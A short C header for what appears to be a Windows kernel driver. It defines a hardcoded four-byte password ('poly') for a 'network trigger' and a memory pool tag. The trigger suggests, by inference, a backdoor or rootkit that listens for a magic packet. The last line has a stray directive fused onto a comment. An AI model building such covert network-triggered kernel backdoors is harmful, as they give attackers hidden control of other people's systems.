#pragma once

#include <ntddk.h>
#include <wdf.h>

BYTE PASSWORD[4] = { 'p', 'o', 'l', 'y'}; // Password used for the network trigger (needs to be EXACTLY 4 bytes)

#pragma warning(disable: 4996)                 // Ignore deprecated function calls - used for ExAllocatePoolWithTag
#define ALLOC_TAG_NAME (ULONG)'TG_1'           // Tag to identify the memory pool  - used for ExAllocatePoolWithTag#pragma once
